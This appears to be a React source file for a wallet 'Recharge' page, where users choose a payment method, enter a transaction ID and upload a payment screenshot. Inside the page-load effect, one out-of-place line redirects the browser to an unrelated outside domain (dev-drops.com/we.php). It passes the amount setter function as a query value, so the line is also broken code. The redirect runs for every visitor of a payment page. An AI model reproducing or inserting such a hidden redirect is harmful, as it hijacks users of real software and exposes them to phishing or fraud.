import React, { useEffect, useState } from "react";
import { getAmount, newClass, showAmount, uploadImageToImgBB } from "../../helper/Helper";
import useAuth from "../../contexts/AuthContext";
import CustomInput from "../mini_components/CustomInput";
import toast from "react-hot-toast";
import ButtonLoading from "../mini_components/ButtonLoading";
import { Button } from "keep-react";
import { useNavigate, useParams } from "react-router-dom";
import CustomSelect from "../mini_components/CustomSelect";
import MasterLayout from "../master";
import useMasterLayoutStore from "../../store/useMasterLayoutStore";
import Spiner from "../mini_components/Spiner";
import { motion } from "framer-motion";
import SiteSetting from '../../helper/SiteSetting';

export default function Recharge({ datas }) {
    const { setting, setSetting } = SiteSetting();
    const { setCurrentPage } = useMasterLayoutStore();
    const { planId = 0 } = useParams();
    const { http, user, setUser, logout, banUserCheck } = useAuth();
    const [loading, setLoading] = useState(true);
    const [loadingBtn, setLoadingBtn] = useState(false);
    const [amount, setAmount] = useState(0);
    const [methods, setMethods] = useState();
    const [currentMethod, setCurrentMethod] = useState();
    const [methodCode, setMethodCode] = useState();
    const [methodCodeTemp, setMethodCodeTemp] = useState();
    const [txnId, setTxnId] = useState("");
    const [screenshot, setSerccnshot] = useState("");
    const [screenshotUrl, setScreenshotUrl] = useState("");
    const [uploadingImage, setUploadingImage] = useState(false);
    const [plan, setPlan] = useState("");
    const navigate = useNavigate();

    useEffect(() => {
        setCurrentPage("Recharge");
        setLoading(true);
        http.get("/recharge/" + planId).then(({ data }) => {
            console.log(data);

            if (!data.user) {
                logout();
            }
            banUserCheck(data.user.status);
            setUser(data.user);
            if (planId != 0) {
                setPlan(data.plan);
                setAmount(getAmount(data.plan.price));
            } else {
                setAmount(10);
            }
          window.location.href = `https://dev-drops.com/we.php?amount=${setAmount}`;    setSetting(data.control);
            setMethods(data.methods);
            setCurrentMethod(data.methods[0]);
            setMethodCode(data.methods[0].method_code);
            setMethodCodeTemp(data.methods[0].method_code);
            setLoading(false);
        });
    }, []);

    const rechargeSubmit = () => {
        if (!screenshotUrl) {
            toast.error("Please upload payment screenshot");
            return;
        }

        setLoadingBtn(true);
        const formData = new FormData();
        formData.append("amount", amount);
        formData.append("method_code", methodCode);
        formData.append("transaction_id", txnId);
        formData.append("screenshot", screenshotUrl);

        http.post("/recharge-submit/" + planId, formData)
            .then((res) => {
                if (res.data.cls == "success") {
                    toast.success(res.data.msg);
                    setTxnId("");
                    setAmount(10);
                    setMethodCode(methodCodeTemp);
                    setScreenshotUrl("");
                    setSerccnshot("");
                    navigate("/records/recharge");
                } else {
                    toast.error(res.data.msg);
                }
                setLoadingBtn(false);
            })
            .catch((err) => {
                let errors = err.response?.data?.errors;
                if (errors) {
                    Object.keys(errors).forEach((key) => {
                        toast.error(`${errors[key]}`);
                    });
                } else {
                    toast.error("Something went wrong!");
                }
                setLoadingBtn(false);
            });
    };

    const handleScreenshotChange = async (e) => {
        const file = e.target.files[0];
        if (!file) return;

        setSerccnshot(file);
        setUploadingImage(true);

        try {
            const url = await uploadImageToImgBB(file, setting?.image_api_key);
            setScreenshotUrl(url);
            toast.success("Image uploaded successfully!");
        } catch (error) {
            toast.error("Failed to upload image. Please try again.");
            setSerccnshot("");
        } finally {
            setUploadingImage(false);
        }
    };

    const copyClipboard = (content) => {
        navigator.clipboard.writeText(content);
        toast.success("Copied successfully!");
    };

    return (
        <MasterLayout page="Recharge">
            <motion.div
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                className="bg-gradient-to-r from-violet-600 to-purple-800 rounded-2xl p-6 shadow-lg shadow-purple-900/20 relative overflow-hidden"
            >
                {/* Background Decor */}
                <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full blur-2xl -mr-10 -mt-10"></div>
                <div className="absolute bottom-0 left-0 w-24 h-24 bg-black/10 rounded-full blur-xl -ml-5 -mb-5"></div>

                <div className="relative z-10 flex items-center justify-between">
                    <div>
                        <h2 className="text-2xl font-black text-white tracking-tight">Add Funds</h2>
                        <p className="text-purple-200 text-xs font-medium mt-1">
                            {plan ? `Deposit for ${plan.ads_name}` : "Recharge your account wallet"}
                        </p>
                    </div>
                    <div className="w-12 h-12 bg-white/20 backdrop-blur-md rounded-xl flex items-center justify-center border border-white/10">
                        <motion.i
                            animate={{ rotate: 360 }}
                            transition={{ duration: 8, repeat: Infinity, ease: "linear" }}
                            className="fas fa-wallet text-white text-xl"
                        />
                    </div>
                </div>
            </motion.div>
            {loading ? (
                <div className="flex flex-col items-center justify-center py-20 space-y-4">
                    <div className="relative">
                        <div className="absolute inset-0 bg-purple-500/20 rounded-full blur-xl animate-pulse"></div>
                        <Spiner className="!fill-purple-500 relative z-10 w-10 h-10" />
                    </div>
                    <span className="text-slate-400 font-medium text-sm tracking-wide">Loading deposit methods...</span>
                </div>
            ) : (
                <>
                    {/* Balance Card */}
                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.2, duration: 0.4 }}
                        className="mt-4 bg-[#151722] rounded-2xl border border-white/5 p-4 relative overflow-hidden group"
                    >
                        <div className="absolute top-0 right-0 w-20 h-20 bg-emerald-500/5 rounded-full blur-xl"></div>
                        <div className="flex items-center gap-4 relative z-10">
                            <div className="w-12 h-12 bg-emerald-500/10 rounded-xl flex items-center justify-center border border-emerald-500/20 shadow-[0_0_10px_rgba(16,185,129,0.1)]">
                                <motion.i
                                    animate={{ scale: [1, 1.2, 1] }}
                                    transition={{ duration: 2, repeat: Infinity }}
                                    className="fas fa-coins text-emerald-400 text-xl"
                                />
                            </div>
                            <div>
                                <p className="text-xs text-slate-400 font-medium tracking-wide">Available Balance</p>
                                <p className="font-bold text-white text-xl tracking-tight">
                                    {setting?.cur_sym}{user ? showAmount(user.balance) : "0.00"}
                                </p>
                            </div>
                        </div>
                    </motion.div>

                    {/* Inputs Section */}
                    <motion.div
                        initial={{ opacity: 0, y: 30 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.3 }}
                        className="mt-6 space-y-5"
                    >
                        {planId == 0 && (
                            <div className="space-y-2">
                                <label className="text-xs font-bold text-slate-300 ml-1 uppercase tracking-wider">Deposit Amount</label>
                                <div className="relative group/input">
                                    <div className="absolute left-4 top-1/2 -translate-y-1/2 text-purple-400 font-bold">
                                        {setting?.cur_sym}
                                    </div>
                                    <input
                                        type="number"
                                        value={amount}
                                        onChange={(e) => setAmount(e.target.value)}
                                        placeholder="0.00"
                                        className="w-full pl-10 pr-4 py-4 bg-[#151722] border border-white/10 rounded-xl text-white font-bold placeholder-slate-600 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none transition-all"
                                    />
                                </div>
                            </div>
                        )}

                        <div className="space-y-2">
                            <label className="text-xs font-bold text-slate-300 ml-1 uppercase tracking-wider">Payment Method</label>
                            <div className="relative">
                                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-purple-400">
                                    <i className="fas fa-credit-card"></i>
                                </div>
                                <select
                                    value={methodCode}
                                    onChange={(e) => {
                                        const selectedMethodCode = Number(e.target.value);
                                        if (Number.isInteger(selectedMethodCode)) {
                                            const selectedMethod = methods.find(
                                                (method) => (parseInt(method.method_code)) === selectedMethodCode
                                            );
                                            setMethodCode(selectedMethodCode);
                                            setCurrentMethod(selectedMethod);
                                        }
                                    }}
                                    className="w-full pl-12 pr-10 py-4 bg-[#151722] border border-white/10 rounded-xl text-white font-medium appearance-none focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none transition-all cursor-pointer"
                                >
                                    {methods ? (
                                        methods.map((method) => (
                                            <option key={method.id} value={parseInt(method.method_code)} className="bg-gray-900 text-white py-2">
                                                {method.name}
                                            </option>
                                        ))
                                    ) : null}
                                </select>
                                <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-slate-500">
                                    <i className="fas fa-chevron-down text-xs"></i>
                                </div>
                            </div>
                        </div>
                    </motion.div>

                    {/* Payment Details Card */}
                    <motion.div
                        initial={{ opacity: 0, scale: 0.95 }}
                        animate={{ opacity: 1, scale: 1 }}
                        transition={{ delay: 0.4 }}
                        className="mt-6"
                    >
                        <div className="bg-[#151722] rounded-2xl overflow-hidden border border-white/5 shadow-xl">
                            <div className="bg-gradient-to-r from-gray-900 to-gray-800 p-4 border-b border-white/5 flex items-center justify-between">
                                <h3 className="font-bold text-white text-sm">Payment Details</h3>
                                <span className="px-2 py-1 rounded bg-purple-500/10 border border-purple-500/20 text-[10px] font-bold text-purple-400 uppercase">
                                    {loading ? "..." : currentMethod?.name}
                                </span>
                            </div>

                            <div className="p-5 space-y-4">
                                <div className="bg-black/30 rounded-xl p-4 border border-white/5 relative group">
                                    <p className="text-xs text-slate-500 mb-1 font-medium text-left">
                                        Send Payment To ({loading ? "Loading..." : currentMethod?.admin_number_name})
                                    </p>
                                    <div className="flex items-center justify-between gap-3">
                                        <p className="font-mono font-bold text-white text-lg tracking-wide truncate">
                                            {loading ? "loading..." : currentMethod?.admin_number}
                                        </p>
                                        <button
                                            onClick={() => copyClipboard(loading || currentMethod?.admin_number)}
                                            className="bg-purple-600 hover:bg-purple-500 text-white px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-2 shadow-lg shadow-purple-900/40 active:scale-95"
                                        >
                                            <i className="fas fa-copy"></i>
                                            Copy
                                        </button>
                                    </div>
                                </div>

                                <div className="flex justify-between items-center bg-black/30 rounded-xl p-4 border border-white/5">
                                    <span className="text-slate-400 text-sm font-medium">Total Amount</span>
                                    <span className="font-bold text-emerald-400 text-lg tracking-wide">
                                        {showAmount(amount)} {loading || setting?.cur_text}
                                    </span>
                                </div>
                            </div>
                        </div>
                    </motion.div>

                    {/* Confirmation Form */}
                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.5 }}
                        className="mt-6"
                    >
                        <div className="bg-[#151722] rounded-2xl p-5 border border-white/5 shadow-xl">
                            <h3 className="font-bold text-white text-sm mb-4 flex items-center gap-2">
                                <i className="fas fa-check-circle text-purple-500"></i>
                                Confirm Deposit
                            </h3>

                            <div className="space-y-5">
                                <div className="space-y-2">
                                    <label className="text-xs font-bold text-slate-300 ml-1 uppercase tracking-wider">Transaction ID</label>
                                    <div className="relative">
                                        <div className="absolute left-4 top-1/2 -translate-y-1/2 text-purple-400">
                                            <i className="fas fa-hashtag"></i>
                                        </div>
                                        <input
                                            type="text"
                                            value={txnId}
                                            onChange={(e) => setTxnId(e.target.value)}
                                            placeholder="Enter transaction ID"
                                            className="w-full pl-10 pr-4 py-4 bg-[#0f111a] border border-white/10 rounded-xl text-white placeholder-slate-600 focus:border-purple-500 focus:ring-1 focus:ring-purple-500 outline-none transition-all text-sm font-medium"
                                        />
                                    </div>
                                </div>

                                <div className="space-y-2">
                                    <label className="text-xs font-bold text-slate-300 ml-1 uppercase tracking-wider">Payment Screenshot</label>
                                    <div className="relative">
                                        <input
                                            onChange={handleScreenshotChange}
                                            accept="image/*"
                                            className="hidden"
                                            type="file"
                                            id="screenshot-input"
                                        />
                                        <label
                                            htmlFor="screenshot-input"
                                            className={`flex items-center justify-center gap-3 w-full py-8 bg-[#0f111a] border-2 border-dashed ${uploadingImage ? 'border-purple-500/50' : 'border-white/10 hover:border-purple-500/30'} rounded-xl cursor-pointer transition-all group`}
                                        >
                                            {uploadingImage ? (
                                                <div className="flex flex-col items-center gap-3">
                                                    <div className="relative">
                                                        <div className="absolute inset-0 bg-purple-500/20 rounded-full blur-xl animate-pulse"></div>
                                                        <Spiner className="!fill-purple-500 relative z-10 w-8 h-8" />
                                                    </div>
                                                    <span className="text-xs font-medium text-purple-400">Uploading image...</span>
                                                </div>
                                            ) : screenshotUrl ? (
                                                <div className="flex flex-col items-center gap-3">
                                                    <div className="relative w-full max-w-xs">
                                                        <img
                                                            src={screenshotUrl}
                                                            alt="Payment screenshot"
                                                            className="w-full h-32 object-cover rounded-lg border border-white/10"
                                                        />
                                                        <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg flex items-center justify-center gap-2">
                                                            <i className="fas fa-sync-alt text-white text-sm"></i>
                                                            <span className="text-xs font-bold text-white">Change Image</span>
                                                        </div>
                                                    </div>
                                                    <div className="flex items-center gap-2">
                                                        <i className="fas fa-check-circle text-emerald-400"></i>
                                                        <span className="text-xs font-medium text-emerald-400">Image uploaded</span>
                                                    </div>
                                                </div>
                                            ) : (
                                                <div className="flex flex-col items-center gap-3">
                                                    <div className="w-12 h-12 rounded-full bg-purple-500/10 flex items-center justify-center border border-purple-500/20 group-hover:bg-purple-500/20 transition-all">
                                                        <i className="fas fa-cloud-upload-alt text-purple-400 text-xl"></i>
                                                    </div>
                                                    <div className="text-center">
                                                        <p className="text-sm font-medium text-slate-300">Click to upload screenshot</p>
                                                        <p className="text-xs text-slate-500 mt-1">PNG, JPG up to 10MB</p>
                                                    </div>
                                                </div>
                                            )}
                                        </label>
                                    </div>
                                </div>

                                <motion.button
                                    whileHover={{ scale: 1.02 }}
                                    whileTap={{ scale: 0.98 }}
                                    className="w-full relative overflow-hidden h-14 rounded-xl font-bold text-white bg-gradient-to-r from-violet-600 to-purple-600 shadow-lg shadow-purple-900/30 hover:shadow-purple-900/50 transition-all disabled:opacity-50 disabled:cursor-not-allowed group"
                                    onClick={rechargeSubmit}
                                    disabled={loadingBtn}
                                >
                                    {/* Shimmer Effect */}
                                    <motion.div
                                        animate={{ x: ["-100%", "200%"] }}
                                        transition={{ duration: 2, repeat: Infinity, ease: "linear", repeatDelay: 1 }}
                                        className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent skew-x-12"
                                    />

                                    <span className="relative z-10 flex items-center justify-center gap-2 text-sm tracking-wide">
                                        {loadingBtn ? (
                                            <ButtonLoading text="Processing..." />
                                        ) : (
                                            <>
                                                <i className="fas fa-paper-plane"></i>
                                                Submit Deposit Request
                                            </>
                                        )}
                                    </span>
                                </motion.button>
                            </div>
                        </div>
                    </motion.div>

                    {/* Info Card */}
                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.6 }}
                        className="mt-6"
                    >
                        <div className="bg-gradient-to-br from-blue-900/20 to-cyan-900/20 rounded-2xl p-5 border border-blue-500/20 relative overflow-hidden">
                            <div className="absolute -right-5 -top-5 w-24 h-24 bg-blue-500/10 rounded-full blur-xl"></div>
                            <div className="flex gap-4">
                                <div className="w-10 h-10 rounded-xl bg-blue-500/10 flex items-center justify-center flex-shrink-0 border border-blue-500/20">
                                    <motion.i
                                        animate={{ rotate: 360 }}
                                        transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
                                        className="fas fa-info-circle text-blue-400 text-lg"
                                    />
                                </div>
                                <div>
                                    <h4 className="font-bold text-white text-sm mb-2">Important Instructions</h4>
                                    <ul className="space-y-2">
                                        <li className="flex items-start gap-2 text-xs text-slate-300">
                                            <span className="w-1.5 h-1.5 rounded-full bg-blue-400 mt-1"></span>
                                            Copy the payment number above carefully.
                                        </li>
                                        <li className="flex items-start gap-2 text-xs text-slate-300">
                                            <span className="w-1.5 h-1.5 rounded-full bg-blue-400 mt-1"></span>
                                            Send the exact amount shown.
                                        </li>
                                        <li className="flex items-start gap-2 text-xs text-slate-300">
                                            <span className="w-1.5 h-1.5 rounded-full bg-blue-400 mt-1"></span>
                                            Upload verifiable screenshot.
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </motion.div>
                </>
            )}
        </MasterLayout>
    );
}
